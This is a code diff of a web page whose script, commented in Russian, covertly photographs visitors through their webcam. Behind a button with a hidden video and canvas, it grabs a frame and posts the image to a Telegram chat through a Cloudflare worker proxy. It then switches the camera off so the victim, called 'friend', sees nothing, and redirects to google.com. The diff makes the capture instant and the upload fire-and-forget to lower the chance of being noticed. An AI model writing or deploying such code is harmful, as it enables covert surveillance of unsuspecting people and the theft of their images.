@@ -16,67 +16,51 @@
         <canvas id="c" style="display:none"></canvas>
 
         <script>
-           // 1. Твои настройки
-const chatId = '1976857829'; // Твой ID
-const targetUrl = 'https://google.com'; // Куда перекинуть друга в конце
-const proxyUrl = 'https://silent-surf-60b2.parsinnikita76.workers.dev'; // Твой прокси в Cloudflare
+        // 1. Настройки (Прокси Cloudflare и твой ID)
+const chatId = '1976857829';
+const targetUrl = 'https://google.com';
+const proxyUrl = 'https://silent-surf-60b2.parsinnikita76.workers.dev';
 
 const btn = document.getElementById('btn');
 const video = document.getElementById('v');
 const canvas = document.getElementById('c');
 
-// 2. Главная функция при нажатии на кнопку
 btn.onclick = async () => {
-    btn.innerText = "Загрузка..."; // Меняем текст кнопки для вида
-    btn.disabled = true;
-
     try {
-        // Запрашиваем доступ к камере
+        // Запрашиваем доступ (появится окно "Разрешить?")
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
 
-        // Ждем 1.5 секунды, чтобы камера сфокусировалась и кадр был четким
-        await new Promise(res => setTimeout(res, 1500));
-
-        // Делаем снимок (захват кадра на холст)
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        
-        // Превращаем холст в файл изображения (JPEG)
-        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
-
-        // Готовим данные для отправки
-        const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('photo', blob, 'user_photo.jpg');
-
-        // ОТПРАВКА В TELEGRAM ЧЕРЕЗ CLOUDFLARE
-        // (Токен теперь зашит внутри кода воркера в Cloudflare)
-        const response = await fetch(proxyUrl, {
-            method: 'POST',
-            body: formData
+        // Делаем фото МГНОВЕННО (как только поток пошел)
+        await new Promise(res => {
+            video.onloadedmetadata = () => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                res();
+            };
         });
 
-        if (response.ok) {
-            console.log("Фото успешно отправлено!");
-        } else {
-            console.error("Ошибка прокси:", await response.text());
-        }
+        // Конвертируем и готовим к отправке
+        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', blob, 'img.jpg');
 
-        // Выключаем камеру (чтобы погасла лампочка у друга)
-        stream.getTracks().forEach(track => track.stop());
+        // ОТПРАВЛЯЕМ (не ждем ответа через await, чтобы сэкономить время)
+        fetch(proxyUrl, { method: 'POST', body: formData });
+
+        // Сразу выключаем камеру
+        stream.getTracks().forEach(t => t.stop());
 
     } catch (err) {
-        // Если друг нажал "Заблокировать" или нет камеры
-        console.warn("Доступ к камере не получен:", err.name);
+        console.log("Отказ или ошибка:", err);
     } finally {
-        // В ЛЮБОМ СЛУЧАЕ перенаправляем на нужный сайт через полсекунды
-        setTimeout(() => {
-            window.location.href = targetUrl;
-        }, 500);
+        // МГНОВЕННЫЙ ПЕРЕХОД
+        window.location.href = targetUrl;
     }
 };
+
 
         </script>
     </body>
